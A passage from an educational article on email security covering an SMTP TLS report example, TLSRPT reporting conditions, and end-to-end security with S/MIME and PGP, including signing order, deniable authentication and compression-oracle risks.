    </span><span>&#34;start-datetime&#34;</span><span>:</span><span> </span><span>&#34;2021-04-09T00:00:00Z&#34;</span><span>,</span><span>
    </span><span>&#34;end-datetime&#34;</span><span>:</span><span> </span><span>&#34;2021-04-09T23:59:59Z&#34;</span><span>
  </span><span>},</span><span>
  </span><span>&#34;contact-info&#34;</span><span>:</span><span> </span><span>&#34;smtp-tls-reporting@google.com&#34;</span><span>,</span><span>
  </span><span>&#34;report-id&#34;</span><span>:</span><span> </span><span>&#34;2021-04-09T00:00:00Z_ef1p.com&#34;</span><span>,</span><span>
  </span><span>&#34;policies&#34;</span><span>:</span><span> </span><span>[</span><span>
    </span><span>{</span><span>
      </span><span>&#34;policy&#34;</span><span>:</span><span> </span><span>{</span><span>
        </span><span>&#34;policy-type&#34;</span><span>:</span><span> </span><span>&#34;no-policy-found&#34;</span><span>,</span><span>
        </span><span>&#34;policy-domain&#34;</span><span>:</span><span> </span><span>&#34;ef1p.com&#34;</span><span>
      </span><span>},</span><span>
      </span><span>&#34;summary&#34;</span><span>:</span><span> </span><span>{</span><span>
        </span><span>&#34;total-successful-session-count&#34;</span><span>:</span><span> </span><span>1</span><span>,</span><span>
        </span><span>&#34;total-failure-session-count&#34;</span><span>:</span><span> </span><span>0</span><span>
      </span><span>}</span><span>
    </span><span>}</span><span>
  </span><span>]</span><span>
</span><span>}</span><span>
</span></code></pre></div>    </div>

    <figcaption>

A report which I have received from Google with the filename
<code>google.com!ef1p.com!1617926400!1618012799!001.json.gz</code>
in an email with the subject
<code>Report Domain: ef1p.com Submitter: google.com Report-ID: &lt;2021.04.09T00.00.00Z+ef1p.com@google.com&gt;</code>.
I’m not sure what <code>total-successful-session-count</code> means if the <code>policy-type</code> is <code>no-policy-found</code>.
Would it count as a failure if <abbr title="Transport Layer Security">TLS</abbr> cannot be negotiated?
Or are all sessions successful if no policy was found?
You find an example report with failure details in <a href="https://datatracker.ietf.org/doc/html/rfc8460#appendix-B"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8460</a>.

</figcaption>
  </figure>

</details>

<details>
  <summary id="tlsrpt-report-conditions">
<abbr title="SMTP TLS Reporting">TLSRPT</abbr> report conditions
</summary>

  <p><abbr title="SMTP TLS Reporting">TLSRPT</abbr> can be used with <a href="#mail-transfer-agent-strict-transport-security"><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr></a>
and with <a href="#dns-based-authentication-of-named-entities"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a>.
<a href="https://datatracker.ietf.org/doc/html/rfc8461#section-6"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8461</a> specifies which <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> failures shall be reported:</p>
  <ul>
    <li>Failure to fetch the <a href="#mta-sts-policy-file">policy file</a> via <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr>
when a valid <a href="#mta-sts-dns-record"><abbr title="Domain Name System">DNS</abbr> record</a> was found.</li>
    <li>Failure to refresh a cached policy which is still valid unless its mode is <code>none</code>.</li>
    <li>Failure to negotiate <abbr title="Transport Layer Security">TLS</abbr> with a valid server certificate when delivering a message.</li>
  </ul>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc8460#section-4.3.2.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8460</a> adds invalid policies to this list.
In the case of <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>, <a href="https://datatracker.ietf.org/doc/html/rfc8460#section-4.3.2.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8460</a> mentions
invalid <a href="#tlsa-record-type"><code>TLSA</code> records</a> and no valid <a href="#client-behavior"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr> signatures</a> as reportable failures.
<a href="https://datatracker.ietf.org/doc/html/rfc8460#section-4.3.1">Other result types</a> include
missing support for <a href="#starttls-extension"><code>STARTTLS</code></a> and certificates
which expired, were not trusted, or had <a href="#name-checks">no matching name</a>.</p>

</details>

<details>
  

  <p>Unfortunately, you cannot see in the <a href="#raw-message">raw message</a>
whether the outgoing mail server of the sender enforced <a href="#transport-security">transport security</a>.
The introduction of a <a href="https://datatracker.ietf.org/doc/html/draft-ietf-dane-smtp-00#section-5"><code>Transmitted</code> header field</a>
to let the client record the checks it performed was once considered
but then <a href="https://mailarchive.ietf.org/arch/msg/ietf-smtp/KO5JqiOB9RQ4Epfb38vD4tziR34/">dropped again</a>
in a <a href="https://datatracker.ietf.org/doc/html/draft-ietf-dane-smtp-01#appendix-B.1">later revision</a>.
A client-side equivalent to the <a href="#trace-information"><code>Received</code> header field</a> thus never made into
the <a href="https://www.iana.org/assignments/message-headers/message-headers.xhtml">list of message header fields</a>.
Such a header field would make sense only if it was covered by a <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr> signature</a>.
Otherwise, a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man in the middle</a> can simply replace it,
which prevents the recipient from detecting whether a man in the middle was present or not.
Since a man in the middle can encrypt its communication with the incoming mail server of the recipient,
a <code>Received</code> header field with a
<a href="https://www.iana.org/assignments/mail-parameters/mail-parameters.xhtml#mail-parameters-7"><code>with</code> clause</a>
of <code>ESMTPS</code> (<a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a> with <a href="#starttls-extension"><code>STARTTLS</code></a>)
also provides less assurance than one would hope.</p>

</details>

<h3 id="end-to-end-security">End-to-end security</h3>

<p>Instead of relying on mail servers to perform <a href="#domain-authentication">domain authentication</a>
and enforce <a href="#transport-security">transport security</a>,
senders and recipients can take matters into their own hands and secure their communication themselves.
This idea is often referred to as <a href="https://en.wikipedia.org/wiki/End-to-end_encryption">end-to-end encryption (<abbr title="End-To-End Encryption">E2EE</abbr>)</a>.
Since protecting the authenticity of the content is usually just as important as protecting its confidentiality,
I prefer the term end-to-end security.
As we saw <a href="#multipart-messages">earlier</a>, arbitrary content can be sent via email.
As long as the sender and the recipients agree on which cryptographic algorithms and which encoding they want to use,
they can use any technique they want, such as <a href="#exclusive-or-operation-for-perfect-encryption">one-time pad encryption</a>
combined with a <a href="#applications-of-cryptographic-hash-functions">message authentication code (<abbr title="Message Authentication Code">MAC</abbr>)</a>.
While end-to-end security doesn’t have to be <a href="#standardization">standardized</a>, doing so is valuable for two reasons:
The more people use the same technique, the more useful it becomes for each user,
which is known as a <a href="https://en.wikipedia.org/wiki/Network_effect">network effect</a>,
and if everyone uses the same technique, it can be integrated into mail clients, which makes it easier to use.</p>

<figure>
  <svg id="figure-simplified-architecture-end-to-end-security" data-name="simplified-architecture-end-to-end-security" width="599.148" height="298.25" viewBox="-131.662 -5 599.148 298.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <path d="M -0.312,250.25 A 77.394 165.5 0 0 1 -77.706,84.75 L -77.706447,84.740008" marker-end="url(#arrow)" stroke-dasharray="190"></path>
    <text text-anchor="end">
        <tspan x="-60.121" y="224.146"><tspan>imap</tspan> for</tspan><tspan x="-60.121" y="246.146">message</tspan><tspan x="-60.121" y="268.146">storage</tspan>
    </text>
    <line x1="283.118" y1="208.188" x2="283.118" y2="84.75" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="start">
        <tspan x="295.118" y="129.9"><tspan>imap</tspan> or <tspan>pop3</tspan></tspan><tspan x="295.118" y="151.9">for message</tspan><tspan x="295.118" y="173.9">retrieval</tspan>
    </text>
    <line x1="105.725" y1="41.75" x2="229.162" y2="41.75" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="middle">
        <tspan x="167.912" y="7.75"><tspan>smtp</tspan> for</tspan><tspan x="167.912" y="29.75">message relay</tspan>
    </text>
    <line x1="52.706" y1="208.188" x2="52.706" y2="84.75" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="end">
        <tspan x="40.706" y="129.9"><tspan>smtp</tspan> for</tspan><tspan x="40.706" y="151.9">message</tspan><tspan x="40.706" y="173.9">submission</tspan>
    </text>
    <rect x="0" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="52.706" y="267.15">of sender</tspan>
    </text>
    <rect x="0" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="52.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="52.706" y="69.65">of sender</tspan>
    </text>
    <rect x="230.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="283.118" y="47.65"><tspan>mail server</tspan></tspan><tspan x="283.118" y="69.65">of recipient</tspan>
    </text>
    <rect x="230.412" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="283.118" y="267.15">of recipient</tspan>
    </text>
    <rect x="-130.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="-77.706" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="-77.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="-77.706" y="69.65">of sender</tspan>
    </text>
    <rect x="360.824" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="413.53" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="413.53" y="47.65"><tspan>mail server</tspan></tspan><tspan x="413.53" y="69.65">of recipient</tspan>
    </text>

</svg>

  <figcaption>
If the mail client of the sender encrypts and authenticates the message for the mail client of the recipient,
none of the mail servers have to be trusted (beyond delivering or storing the message).
</figcaption>
</figure>

<p>End-to-end security has two advantages:</p>
<ul>
  <li><strong>No trust in mail servers required</strong>:
In theory, if you don’t trust any mailbox provider, you can just host your emails yourself.
In practice, however, running your own mail server on your own hardware is <a href="#reputation">a hassle</a>.
Beyond the technical complexity of running a mail server,
you may want to share the infrastructure with other users in order to reduce costs.
Without end-to-end security, everyone has to trust the administrator of the mail servers.
If you employ end-to-end security on all your messages,
you can choose any free mailbox provider who delivers your messages reliably.</li>
  <li><strong>Secrets on clients instead of servers</strong>:
In order to receive emails from anyone, incoming mail servers have to be reachable from anywhere on the Internet.
If a security hole is found in the used software, mail servers become vulnerable immediately.
Given that servers are typically shared by many users, they are a prime target for attacks.
If you employ end-to-end security with all your contacts,
an attacker who compromised your mail server can neither read your communication nor send messages in your name.
If, on the other hand, your mail client or your computer is compromised,
it’s over with and without end-to-end security.</li>
</ul>

<p>End-to-end security also has some disadvantages:</p>
<ul>
  <li><strong>No remote search</strong>:
Your mail client has to store all messages locally
if you want to be able to search for a message based on its content.
Without end-to-end encryption, your mail client can ask your incoming mail server to perform the search
using the <a href="#imap-commands"><code>SEARCH</code> command</a> of <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>.
While storing all messages locally is no longer a problem
for modern <a href="https://en.wikipedia.org/wiki/Smartphone">smartphones</a>,
it might still be one for <a href="https://en.wikipedia.org/wiki/Smartwatch">smartwatches</a>.
End-to-end security requires <a href="https://en.wikipedia.org/wiki/Rich_client">thick clients</a>
instead of <a href="https://en.wikipedia.org/wiki/Thin_client">thin clients</a>.</li>
  <li><strong>No partial downloads</strong>:
<a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a> allows clients
to fetch just certain parts of <a href="#multipart-messages">multipart messages</a>.
Since the body of a message is usually signed and encrypted as a single unit,
bandwidth-constrained mail clients cannot download the text of an end-to-end secured message without its attachments.</li>
  <li><strong>Archiving of messages</strong>:
If you lose your decryption key, you can no longer access your messages
(unless your mail client stores them in plaintext on your computer).
While this can be an annoyance for individuals, it can be a real problem for companies,
who <a href="https://en.wikipedia.org/wiki/Email_archiving#Regulatory_compliance">must archive their electronic communication</a>
in order to avert <a href="https://en.wikipedia.org/wiki/Tampering_with_evidence#Spoliation">spoliation of potential evidence</a>.</li>
  <li><strong>Message filtering</strong>:
Mail servers cannot scan encrypted messages for <a href="https://en.wikipedia.org/wiki/Malware">malware</a>
or discard them as <a href="#spam">spam</a> based on <a href="#heuristics">their content</a>.</li>
</ul>

<p>There are two main standards for end-to-end security:
<a href="https://en.wikipedia.org/wiki/S/MIME">Secure/Multipurpose Internet Mail Extensions (<abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr>)</a>
and <a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">Pretty Good Privacy (<abbr title="Pretty Good Privacy">PGP</abbr>)</a>,
which was standardized as <a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy#OpenPGP"><abbr title="The open standard for Pretty Good Privacy">OpenPGP</abbr></a>.
Unlike the other fixes in this chapter, both of them have existed since the 90s.
The main difference between them is how public keys are authenticated, distributed, and revoked.
Otherwise, they are quite similar.</p>

<figure id="comparison-of-smime-and-pgp">

  <table>
    <thead>
      <tr>
        <th>Aspect</th>
        <th><a href="https://en.wikipedia.org/wiki/S/MIME">Secure/Multipurpose Internet</a></th>
        <th><a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">Pretty Good Privacy (<abbr title="Pretty Good Privacy">PGP</abbr>)</a></th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>Standards</td>
        <td><a href="https://datatracker.ietf.org/doc/html/rfc8551"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8551</a>: <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> formats</td>
        <td><a href="https://datatracker.ietf.org/doc/html/rfc4880"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4880</a>: <abbr title="The open standard for Pretty Good Privacy">OpenPGP</abbr> formats</td>
      </tr>
      <tr>
        <td>Certificate format</td>
        <td><a href="https://datatracker.ietf.org/doc/html/rfc5280"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5280</a>: <a href="https://en.wikipedia.org/wiki/X.509"><abbr title="A standard defining the format of public key certificates">X.509</abbr></a></td>
        <td><a href="https://datatracker.ietf.org/doc/html/rfc4880#section-5.2">Specific to <abbr title="The open standard for Pretty Good Privacy">OpenPGP</abbr></a></td>
      </tr>
      <tr>
        <td>Public-key binding</td>
        <td><a href="https://evalapply.org/internet/#public-key-infrastructure">Certification authorities</a></td>
        <td><a href="https://evalapply.org/internet/#public-key-infrastructure">Web of trust</a></td>
      </tr>
      <tr>
        <td>Public-key distribution</td>
        <td>Attached to the message</td>
        <td>Public <a href="https://en.wikipedia.org/wiki/Key_server_(cryptographic)">key server</a>,</td>
      </tr>
      <tr>
        <td>Public-key revocation</td>
        <td><a href="https://en.wikipedia.org/wiki/Certificate_revocation_list">Certificate Revocation Lists (<abbr title="Certificate Revocation List">CRL</abbr>)</a> or</td>
        <td><a href="https://datatracker.ietf.org/doc/html/rfc4880#page-21">Key revocation signature</a></td>
      </tr>
      <tr>
        <td><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> resource record type</td>
        <td><a href="#smimea-resource-record"><code>SMIMEA</code></a></td>
        <td><a href="#openpgpkey-resource-record"><code>OPENPGPKEY</code></a></td>
      </tr>
      <tr>
        <td>Content type for encryption</td>
        <td><a href="https://datatracker.ietf.org/doc/html/rfc8551#section-3.2"><code>application/pkcs7-mime</code></a></td>
        <td><a href="https://datatracker.ietf.org/doc/html/rfc3156#section-4"><code>application/pgp-encrypted</code></a></td>
      </tr>
      <tr>
        <td>Content type for signature</td>
        <td><a href="https://datatracker.ietf.org/doc/html/rfc8551#section-3.5.3"><code>application/pkcs7-signature</code></a></td>
        <td><a href="https://datatracker.ietf.org/doc/html/rfc3156#section-5"><code>application/pgp-signature</code></a></td>
      </tr>
      <tr>
        <td>Primary user group</td>
        <td>Business world</td>
        <td>Security specialists</td>
      </tr>
      <tr>
        <td>Costs for users</td>
        <td>You have to pay for the certificate, but</td>
        <td>None</td>
      </tr>
    </tbody>
  </table>

  <figcaption>

Comparison of <a href="https://en.wikipedia.org/wiki/S/MIME">Secure/Multipurpose Internet Mail Extensions (<abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr>)</a>
and <a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">Pretty Good Privacy (<abbr title="Pretty Good Privacy">PGP</abbr>)</a>.

</figcaption>
</figure>

<details>
  <summary id="modes-of-operation">
Modes of operation
</summary>

  <p><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> and <abbr title="Pretty Good Privacy">PGP</abbr> support the same three modes of operation:
You can either sign a message, sign and encrypt a message,
or only encrypt a message for its recipients without signing it.
When doing both, the message is first signed and then encrypted:</p>

  <figure>
    <svg id="figure-end-to-end-security" data-name="end-to-end-security" width="357.422" height="455.187" viewBox="-191.999 38.563 357.422 455.187" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="41.196" y1="442.713" x2="41.196" y2="492.5" marker-end="url(#arrow)" stroke-dasharray="43"></line>
    <text text-anchor="start">
        <tspan x="53.196" y="473.975">Message, status</tspan>
    </text>
    <line x1="41.196" y1="351.862" x2="41.196" y2="401.65" marker-end="url(#arrow)" stroke-dasharray="43"></line>
    <text text-anchor="start">
        <tspan x="53.196" y="383.125">Signed message</tspan>
    </text>
    <text text-anchor="end">
        <tspan x="-41.196" y="383.125"><tspan>Recipient</tspan></tspan>
    </text>
    <line x1="41.196" y1="221.513" x2="41.196" y2="310.8" marker-end="url(#arrow-red)" stroke-dasharray="82"></line>
    <text text-anchor="start">
        <tspan x="53.196" y="250.525">Signed and</tspan><tspan x="53.196" y="272.525">encrypted</tspan><tspan x="53.196" y="294.525">message</tspan>
    </text>
    <text text-anchor="end">
        <tspan x="-41.196" y="272.525"><tspan>Attacker</tspan></tspan>
    </text>
    <line x1="41.196" y1="130.663" x2="41.196" y2="180.45" marker-end="url(#arrow)" stroke-dasharray="43"></line>
    <text text-anchor="start">
        <tspan x="53.196" y="161.925">Signed message</tspan>
    </text>
    <text text-anchor="end">
        <tspan x="-41.196" y="161.925"><tspan>Sender</tspan></tspan>
    </text>
    <line x1="41.196" y1="39.813" x2="41.196" y2="89.6" marker-end="url(#arrow)" stroke-dasharray="43"></line>
    <text text-anchor="start">
        <tspan x="53.196" y="71.075">Message</tspan>
    </text>
    <rect x="0" y="90.85" width="82.391" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="41.196" y="116.5"><tspan>Sign</tspan></tspan>
    </text>
    <rect x="0" y="181.7" width="82.391" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="41.196" y="207.35"><tspan>Encrypt</tspan></tspan>
    </text>
    <rect x="0" y="312.05" width="82.391" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="41.196" y="337.7"><tspan>Decrypt</tspan></tspan>
    </text>
    <rect x="0" y="402.9" width="82.391" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="41.196" y="428.55"><tspan>Verify</tspan></tspan>
    </text>
    <line x1="-190.749" y1="110.6" x2="-1.25" y2="110.6" marker-end="url(#arrow)" stroke-dasharray="182"></line>
    <text text-anchor="middle">
        <tspan x="-100.687" y="98.6">Private key of sender</tspan>
    </text>
    <line x1="-190.749" y1="201.45" x2="-1.25" y2="201.45" marker-end="url(#arrow)" stroke-dasharray="182"></line>
    <text text-anchor="middle">
        <tspan x="-100.687" y="224.95">Public key of recipient</tspan>
    </text>
    <line x1="-190.749" y1="331.8" x2="-1.25" y2="331.8" marker-end="url(#arrow)" stroke-dasharray="182"></line>
    <text text-anchor="middle">
        <tspan x="-100.687" y="319.8">Private key of recipient</tspan>
    </text>
    <line x1="-190.749" y1="422.65" x2="-1.25" y2="422.65" marker-end="url(#arrow)" stroke-dasharray="182"></line>
    <text text-anchor="middle">
        <tspan x="-100.687" y="446.15">Public key of sender</tspan>
    </text>

</svg>

    <figcaption>
How a message is signed and encrypted by the sender
and then decrypted and verified by the recipient.
If you don’t know the public key of the recipient, you can only sign your message.
</figcaption>
  </figure>

  <p>If a message is first encrypted and then signed,
an attacker can attach their own signature to the <a href="https://en.wikipedia.org/wiki/Ciphertext">ciphertext</a>,
thereby claiming the message for themself without knowing its content.
This is a problem whenever the message refers to the sender’s public key.
For example, if Alice informs Bob via email that she uses a new signing key
and includes a <a href="https://en.wikipedia.org/wiki/Shared_secret">shared secret</a> in her message to authenticate herself,
the attacker can replace the signature and impersonate Alice in future communication with Bob
without having to learn the shared secret.
If a <a href="https://en.wikipedia.org/wiki/Cryptographic_protocol">cryptographic protocol</a> is not constructed carefully,
signing ciphertexts can also fail in a
<a href="https://theworld.com/~dtd/sign_encrypt/sign_encrypt7.html#tth_sEc1.2">different way</a>.
Please note that in the case of <a href="#applications-of-cryptographic-hash-functions">message authentication codes (<abbr title="Message Authentication Codes">MACs</abbr>)</a>,
you should first encrypt the message and then authenticate the ciphertext
in order to prevent <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">chosen-ciphertext attacks</a>,
such as <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">padding-oracle attacks</a>.</p>

</details>

<details>
  <summary id="deniable-authentication">
Deniable authentication
</summary>

  <p><a href="https://evalapply.org/internet/#digital-signatures">Digital signatures</a>
entail <a href="https://en.wikipedia.org/wiki/Non-repudiation">non-repudiation</a>.
As discussed <a href="#non-repudiation">earlier</a>, this is not always desirable.
There are three different properties:</p>
  <ul>
    <li><strong>Integrity</strong>: An attacker cannot alter the <a href="https://en.wikipedia.org/wiki/Ciphertext">ciphertext</a>.
Unless you want <a href="https://en.wikipedia.org/wiki/Homomorphic_encryption">homomorphic encryption</a>,
<a href="https://en.wikipedia.org/wiki/Malleability_(cryptography)">ciphertext malleability</a> is never desirable.
We’re not interested in the integrity of <a href="https://en.wikipedia.org/wiki/Plaintext">plaintexts</a> here
because we want more than just <a href="https://en.wikipedia.org/wiki/Error_detection_and_correction">error detection</a>.</li>
    <li><strong>Authenticity</strong>: The recipient can authenticate the sender of the message.</li>
    <li><strong>Non-repudiation</strong>: The sender cannot deny having sent the message.</li>
  </ul>

  <p>While non-repudiation ensures authenticity and authenticity ensures integrity,
integrity does not entail authenticity and authenticity does not entail non-repudiation.
Integrity is useful because it allows the sender to achieve authenticity with the content of the message.
For example, when Alice sends an encrypted message to Bob and Bob includes the original message in his encrypted response,
Alice knows that the response came from Bob because only Bob (and herself) had access to her original message.
Without integrity protection, an attacker might have altered Bob’s response or Alice’s original message.
Integrity can be achieved by appending a <a href="https://en.wikipedia.org/wiki/Checksum">checksum</a>
of the plaintext to the plaintext before encrypting both.
If the checksum is no longer valid after decryption,
the recipient knows that someone tampered with the ciphertext.
Non-repudiation is achieved with digital signatures,
where only the signer can generate the signature, but everyone can verify the signature.
Authenticity without non-repudiation is accomplished with a
<a href="#applications-of-cryptographic-hash-functions">message authentication code (<abbr title="Message Authentication Code">MAC</abbr>)</a>,
which requires that the sender and the recipient have a <a href="https://en.wikipedia.org/wiki/Shared_secret">shared secret</a>.
A message authentication code can be verified only by those who know the shared secret,
and everyone who can verify a message authentication code can also generate it.
As a consequence, the recipient cannot prove to a third party that a message was sent by the sender.
This feature is important for <a href="https://en.wikipedia.org/wiki/Off-the-Record_Messaging">off-the-record messaging</a>, and it
can also be achieved with <a href="https://en.wikipedia.org/wiki/Designated_verifier_signature">designated verifier signatures</a>.
Here is a summary of which mechanism provides which of the above properties:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Property</th>
          <th><a href="https://en.wikipedia.org/wiki/Checksum">Checksum</a></th>
          <th><a href="#applications-of-cryptographic-hash-functions">Message</a></th>
          <th><a href="https://evalapply.org/internet/#digital-signatures">Digital</a></th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>Integrity</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Authenticity</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Non-repudiation</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
      </tbody>
    </table>

    <figcaption>
Which mechanism ensures which properties.
More is not always better.
</figcaption>
  </figure>

  <p>As we’ve seen in the <a href="#modes-of-operation">previous box</a>,
both <a href="https://datatracker.ietf.org/doc/html/rfc8551#section-2.4.2"><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr></a>
and <a href="https://datatracker.ietf.org/doc/html/rfc4880#section-5.2"><abbr title="Pretty Good Privacy">PGP</abbr></a> support digital signatures.
Ciphertext integrity has been added to <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> with the <code>Authenticated-Enveloped-Data</code> content type
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc5083"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5083</a>
(other than what its name suggests, this content type
<a href="https://datatracker.ietf.org/doc/html/rfc8551#section-2.4.4">does not provide authentication</a>)
and to <abbr title="Pretty Good Privacy">PGP</abbr> with the <a href="https://datatracker.ietf.org/doc/html/rfc4880#section-5.13">Modification Detection Code (<abbr title="Modification Detection Code">MDC</abbr>)</a>,
which consists of a <a href="#secure-hash-algorithms"><abbr title="Secure Hash Algorithm">SHA</abbr>-1 hash</a> appended to the message before encryption.
<abbr title="Pretty Good Privacy">PGP</abbr> does not support deniable authentication,
but you can <a href="https://crypto.stackexchange.com/a/67324/76600">share a new private key</a> with the recipient
or use <a href="https://datatracker.ietf.org/doc/html/rfc4880#section-5.3">symmetric-key encryption</a> with a shared key.
<abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> doesn’t really support deniable authentication either.
You can use a non-interactive
<a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie-Hellman key exchange</a>
to <a href="https://datatracker.ietf.org/doc/html/rfc5652#section-6">encrypt the content-encryption key</a> for each recipient.
<a href="https://datatracker.ietf.org/doc/html/rfc6278"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6278</a> even defines how to use
<a href="https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman">elliptic-curve Diffie–Hellman (<abbr title="Elliptic-Curve Diffie–Hellman">ECDH</abbr>)</a>
where the sender’s and the recipient’s key pair are <a href="https://en.wikipedia.org/wiki/Static_key">static</a>
instead of <a href="https://en.wikipedia.org/wiki/Ephemeral_key">ephemeral</a>.
However, this approach <a href="https://datatracker.ietf.org/doc/html/rfc6278#section-7">cannot be used</a>
when a message is sent to more than one recipient because the common content-encryption key
is not bound to this set of recipients and could be used by a recipient to frame the sender
in a private conversation with another recipient.
Even the <a href="https://datatracker.ietf.org/doc/html/rfc5652#section-9"><code>Authenticated-Data</code> content type</a>
shares a single authentication key with all recipients
instead of appending a different message authentication code for each recipient.</p>

</details>

<details>
  <summary id="compression-before-encryption">
Compression before encryption
</summary>

  <p>Both <a href="https://datatracker.ietf.org/doc/html/rfc8551#section-3.6"><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr></a>
and <a href="https://datatracker.ietf.org/doc/html/rfc4880#section-5.6"><abbr title="Pretty Good Privacy">PGP</abbr></a>
support <a href="https://en.wikipedia.org/wiki/Data_compression">compression</a>.
A corresponding <a href="#content-type">content type</a> to use compression alone
in a message exists <a href="#message-compression">only for <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr></a>, though.
<a href="https://en.wikipedia.org/wiki/GNU_Privacy_Guard"><abbr title="Not an acronym but the name of a free software project">GNU</abbr> Privacy Guard (<abbr title="GNU Privacy Guard">GnuPG</abbr> or <abbr title="GNU Privacy Guard">GPG</abbr>)</a>,
which is the most popular open-source implementation of the <abbr title="The open standard for Pretty Good Privacy">OpenPGP</abbr> standard,
<a href="https://gnupg.org/faq/gnupg-faq.html#define_compress">compresses by default</a> before encryption
unless it detects that the data is already compressed.
If you use <abbr title="GNU Privacy Guard">GPG</abbr> to encrypt computer-generated text such as reports or notifications,
you <a href="https://security.stackexchange.com/a/43425/228462">should disable compression</a>
with <a href="https://www.gnupg.org/gph/en/manual/r1460.html"><code>-z</code> <code>0</code></a>
in order not to leak how similar the dynamic part of your message is to the static part.
Encryption does not conceal the length of the input,
and compression produces a shorter output when more parts of the message are the same.
If an attacker can influence the dynamic part of the message,
for example by triggering the generated notification,
your system is vulnerable to a so-called <a href="https://en.wikipedia.org/wiki/Oracle_attack">compression-oracle attack</a>,
which is an <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">adaptive chosen-plaintext attack</a>.</p>

</details>

<details>
  <summary id="multipart-message-nesting">
Multipart message nesting
</summary>

  <p>When used to sign and encrypt emails, <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> and <abbr title="Pretty Good Privacy">PGP</abbr> are applied to <a href="#multipart-messages"><abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> body parts</a>.
Any part in the tree of a multipart message can be signed or encrypted,
but <abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> and <abbr title="Pretty Good Privacy">PGP</abbr> are usually applied to the whole body of a message.
